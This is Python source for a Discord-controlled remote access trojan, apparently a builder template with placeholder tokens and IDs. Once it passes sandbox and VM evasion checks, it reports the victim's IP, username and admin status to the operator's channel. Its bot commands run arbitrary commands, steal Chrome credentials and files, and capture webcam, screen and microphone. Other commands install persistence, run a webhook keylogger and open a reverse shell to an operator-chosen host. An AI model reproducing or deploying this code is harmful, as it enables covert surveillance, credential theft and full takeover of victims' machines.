import discord
from discord.ext import commands
from discord import app_commands
import os
import subprocess as sp
import requests
import random
from cv2 import VideoCapture
from cv2 import imwrite
from scipy.io.wavfile import write
from sounddevice import rec, wait
import platform
import re
from urllib.request import Request, urlopen
import pyautogui
from datetime import datetime
import shutil
import sys
from multiprocessing import Process
import threading
import json
import ctypes
from ctypes.wintypes import HKEY
import time
from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
import win32api
import win32process
import psutil
import win32pdh
from winreg import *
from ctypes import *
from libraries import credentials,keylogger,sandboxevasion,disctopia


GUILD = discord.Object(id = "{GUILD}")
CHANNEL = {CHANNEL}
KEYLOGGER_WEBHOOK = "{KEYLOG_WEBHOOK}"

class Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix = "!", intents = intents, help_command=None)

    async def on_ready(self):
        await self.wait_until_ready()
    
        self.channel = self.get_channel(CHANNEL)
        now = datetime.now()
        my_embed = discord.Embed(title=f"{MSG}",description=f"**Time: {now.strftime('%d/%m/%Y %H:%M:%S')}**", color=COLOR)
        my_embed.add_field(name="**IP**", value=disctopia.getIP(), inline=True)
        my_embed.add_field(name="**Bits**", value=disctopia.getBits(), inline=True)
        my_embed.add_field(name="**HostName**", value=disctopia.getHostname(), inline=True)
        my_embed.add_field(name="**OS**", value=disctopia.getOS(), inline=True) 
        my_embed.add_field(name="**Username**", value=disctopia.getUsername(), inline=True)
        my_embed.add_field(name="**CPU**", value=disctopia.getCPU(), inline=False)
        my_embed.add_field(name="**Is Admin**", value=disctopia.isAdmin(), inline=True)
        my_embed.add_field(name="**Is VM**", value=disctopia.isVM(), inline=True)
        my_embed.add_field(name="**Auto Keylogger**", value=False, inline=True)
        await self.channel.send(embed=my_embed)

    async def setup_hook(self):
        await self.tree.sync(guild = GUILD)

    async def on_command_error(self, ctx, error):
        my_embed = discord.Embed(title=f"**Error:** {error}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

bot = Bot()

@bot.hybrid_command(name = "cmd", with_app_command = True, description = "Run any command on the target machine")
@app_commands.guilds(GUILD)
async def cmd(ctx: commands.Context, id:int, command:str):
    if (id == int(ID)):
        result = disctopia.cmd(command)
        if len(result) > 4000:
            path = os.environ["temp"] +"\\response.txt"     
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.reply("```"+result+"```")

@bot.hybrid_command(name = "cmd-all", with_app_command = True, description = "Run any command on the all online agents")
@app_commands.guilds(GUILD)
async def cmd_all(ctx: commands.Context, command:str):
    result = disctopia.cmd(command)
    if len(result) > 4000:
        path = os.environ["temp"] +"\\response.txt"     
        with open(path, 'w') as file:
            file.write(result)
        await ctx.reply(file=discord.File(path))
        os.remove(path)
    else:
        await ctx.reply("```"+result+"```")


@bot.hybrid_command(name = "webshot", with_app_command = True, description = "Capture a picture from the target machine's screen")
@app_commands.guilds(GUILD)
async def webshot(ctx: commands.Context, id:int):
    if (id == int(ID)):
        if ctx.interaction:
            my_embed = discord.Embed(title=f"Please use **!webshot {ID}** instead of the slash command", color=0xFF0000)
            await ctx.reply(embed=my_embed) 
        else:
            result = disctopia.webshot()
            if result != False:
                await ctx.reply(file=discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(title=f"Error while taking photo to Agent#{ID}", color=0xFF0000)
                await ctx.reply(embed=my_embed)
        
@bot.hybrid_command(name = "cd", with_app_command = True, description = "Change the current directory on the target machine")
@app_commands.guilds(GUILD)
async def cd(ctx: commands.Context, id:int, path:str):
    if (id == int(ID)):
        result = disctopia.cd(path)
        if (result):
            my_embed = discord.Embed(title=f"Succesfully changed directory to: {path}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while changing directory:\n{result}", color=0xFF0000)    
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "process", with_app_command = True, description = "List all the processes running on the target machine")
@app_commands.guilds(GUILD)
async def process(ctx: commands.Context, id:int):
    if (id == int(ID)):
        result = disctopia.process()
        if len(result) > 4000:
            path = os.environ["temp"] +"\\response.txt"         
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.reply(f"```\n{result}\n```")

@bot.hybrid_command(name = "upload", with_app_command = True, description = "Upload a file to the agent")
@app_commands.guilds(GUILD)
async def upload(ctx: commands.Context, id:int, url:str, name:str):
    if (id == int(ID)):
        result = disctopia.upload(url, name)
        if result:
            my_embed = discord.Embed(title=f"{name} has been uploaded to Agent#{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while uploading {name} to Agent#{ID}:\n{result}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "screenshot", with_app_command = True, description = "Take a screenshot of the target machine's screen")
@app_commands.guilds(GUILD)
async def screenshot(ctx: commands.Context, id:int):
    if (id == int(ID)):
        result = disctopia.screenshot()
        if result != False:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{ID}", color=0xFF0000)
            await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "creds", with_app_command = True, description = "Get the credentials of the target machine")
@app_commands.guilds(GUILD)
async def creds(ctx: commands.Context, id:int):
    if (id == int(ID)):
        result = disctopia.creds()
        if result != False:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "persistent", with_app_command = True, description = "Make the agent persistent on the target machine")
@app_commands.guilds(GUILD)
async def persistent(ctx: commands.Context, id:int):
    if (id == int(ID)):
        result = disctopia.persistent()
        if result:
            my_embed = discord.Embed(title=f"Persistance enabled on Agent#{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while enabling persistance on Agent#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "ls", with_app_command = True, description = "List all the current online agents")
@app_commands.guilds(GUILD)
async def ls(ctx: commands.Context):
    if ctx.interaction:
         my_embed = discord.Embed(title=f"Please use **!ls** instead of the slash command", color=0xFF0000)
    else:
        my_embed = discord.Embed(title=f"Agent #{ID}   IP: {disctopia.getIP()}", color=0xADD8E6)
        my_embed.add_field(name="**OS**", value=disctopia.getOS(), inline=True)
        my_embed.add_field(name="**Username**", value=disctopia.getUsername(), inline=True)
    await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "download", with_app_command = True, description = "Download file from the target machine")
@app_commands.guilds(GUILD)
async def download(ctx: commands.Context, id:int, path:str):
    if (id == int(ID)):
        try:
            await ctx.reply(f"**Agent #{ID}** Requested File:", file=discord.File(path))
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while downloading from Agent#{ID}:\n{e}", color=0xFF0000)
            await ctx.reply(embed=my_embed) 

@bot.hybrid_command(name = "terminate", with_app_command = True, description = "Terminate the agent")
@app_commands.guilds(GUILD)
async def download(ctx: commands.Context, id:int):
    if (id == int(ID)):
        my_embed = discord.Embed(title=f"Terminating Connection With Agent#{ID}", color=0x00FF00)
        await ctx.reply(embed=my_embed)
        await bot.close()        
        sys.exit()

@bot.hybrid_command(name = "selfdestruct", with_app_command = True, description = "Delete the agent from the target machine")
@app_commands.guilds(GUILD)
async def selfdestruct(ctx: commands.Context, id:int):
    if (id == int(ID)):
        result = disctopia.selfdestruct()
        if result:
            my_embed = discord.Embed(title=f"Agent#{ID} has been deleted", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while deleting Agent#{ID}: {result}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "location", with_app_command = True, description = "Get the location of the target machine")
@app_commands.guilds(GUILD)
async def location(ctx: commands.Context, id:int):
    if (id == int(ID)):
        response = disctopia.location()
        if response != False:
            my_embed = discord.Embed(title=f"IP Based Location on Agent#{ID}", color=0x00FF00)
            my_embed.add_field(name="IP:", value=f"**{response.json()['YourFuckingIPAddress']}**", inline=False)
            my_embed.add_field(name="Hostname:", value=f"**{response.json()['YourFuckingHostname']}**", inline=False)
            my_embed.add_field(name="City:", value=f"**{response.json()['YourFuckingLocation']}**", inline=False)
            my_embed.add_field(name="Country:", value=f"**{response.json()['YourFuckingCountryCode']}**", inline=False)
            my_embed.add_field(name="ISP:", value=f"**{response.json()['YourFuckingISP']}**", inline=False)
        else:
            my_embed = discord.Embed(title=f"Error while getting location of Agent#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "revshell", with_app_command = True, description = "Get a reverse shell on the target machine")
@app_commands.guilds(GUILD)
async def location(ctx: commands.Context, id:int, ip:str, port:int):
    if (id == int(ID)):
        result = disctopia.revshell(ip, port)
        if result:
            my_embed = discord.Embed(title=f"Attempting to Establish Reverse Shell on Agent#{ID}", color=0x00FF00)
        await ctx.reply(embed=my_embed)
    
@bot.hybrid_command(name = "recordmic", with_app_command = True, description = "Record the microphone of the target machine")
@app_commands.guilds(GUILD)
async def recordmic(ctx: commands.Context, id:int, seconds:int):
    if (id == int(ID)):
        if ctx.interaction:
            my_embed = discord.Embed(title=f"Please use **!recordmic {ID}** instead of the slash command", color=0xFF0000)
            await ctx.reply(embed=my_embed)
        else:
            result = disctopia.recordmic(seconds)
            if result != False:
                await ctx.reply(file=discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(title=f"Error while starting recording on Agent#{ID}", color=0xFF0000)
                await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "wallpaper", with_app_command = True, description = "Change the wallpaper of the target machine")
@app_commands.guilds(GUILD)
async def wallpaper(ctx: commands.Context, id:int, path_url:str):
    if (id == int(ID)):
        result = disctopia.wallpaper(path_url)
        if result:
            my_embed = discord.Embed(title=f"Wallpaper changed on Agent#{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while changing wallpaper on Agent#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "killproc", with_app_command = True, description = "Kill a process on the target machine")
@app_commands.guilds(GUILD)
async def killproc(ctx: commands.Context, id:int, pid:int):
    if (id == int(ID)):
        result = disctopia.killproc(pid)
        if result:
            my_embed = discord.Embed(title=f"Process {pid} killed on Agent#{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while killing process {pid} on Agent#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "keylog", with_app_command = True, description = "Start a keylogger on the target machine")
@app_commands.guilds(GUILD)
async def keylog(ctx: commands.Context, id:int, mode:str ,interval:int):
    if (id == int(ID)):
        logger = keylogger.Keylogger(interval=interval, ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
        if mode == "stop":
            logger.stop()
            await ctx.reply(embed=discord.Embed(title=f"Keylogger stopped on Agent#{ID}", color=0x00FF00))
        else:
            threading.Thread(target=logger.start).start()
            await ctx.reply(embed=discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF00))

@bot.hybrid_command(name = "help", with_app_command = True, description = "Help menu")
@app_commands.guilds(GUILD)
async def keylog(ctx: commands.Context):
    my_embed = discord.Embed(title=f"Help Menu", color=0x00FF00)
    my_embed.add_field(name="/help", value="Shows this menu", inline=False)
    my_embed.add_field(name="/cmd <id> <command>", value="Run command on target", inline=False)
    my_embed.add_field(name="/cd <id> <path>", value="Change current directory", inline=False)
    my_embed.add_field(name="/webshot <id>", value="Grab a picture from the webcam", inline=False)
    my_embed.add_field(name="/process <id>", value="Get a list of all running processes", inline=False)
    my_embed.add_field(name="/upload <id> <url>", value="Upload file to agent", inline=False)
    my_embed.add_field(name="/screenshot <id> ", value="Grab a screenshot from the agent", inline=False)
    my_embed.add_field(name="/creds <id>", value="Get chrome saved credentials", inline=False)
    my_embed.add_field(name="/persistent <id>", value="Enable persistence", inline=False)
    my_embed.add_field(name="/ls", value="Get a list of all active agents", inline=False)
    my_embed.add_field(name="/download <id> <path>", value="Download file from agent", inline=False)
    my_embed.add_field(name="/terminate <id>", value="Terminate the session ", inline=False)
    my_embed.add_field(name="/cmd-all <command>", value="Run a command on all agents", inline=False)
    my_embed.add_field(name="/location <id>", value="Get the location of the target machine", inline=False)
    my_embed.add_field(name="/revshell <id> <ip> <port>", value="Get a reverse shell on the target machine", inline=False)
    my_embed.add_field(name="/recordmic <id> <interval>", value="Record the microphone of the target machine", inline=False)
    my_embed.add_field(name="/wallpaper <id> <path/url>", value="Change the wallpaper of the target machine", inline=False)
    my_embed.add_field(name="/killproc <id> <pid>", value="Kill a process on the target machine", inline=False)
    my_embed.add_field(name="/keylog <id> <mode> <interval>", value="Start/Stop a keylogger on the target machine", inline=False)
    my_embed.add_field(name="/selfdestruct <id>", value="Delete the agent", inline=False)
    await ctx.reply(embed=my_embed)



if sandboxevasion.test() == True and disctopia.isVM() == False:
    config = disctopia.createConfig()
    ID = disctopia.id()
    if config:
        MSG = f"New Agent Online #{ID}"
        COLOR = 0x00ff00
    else:
        MSG =f"Agent Online #{ID}"
        COLOR = 0x0000FF

    bot.run("{TOKEN}")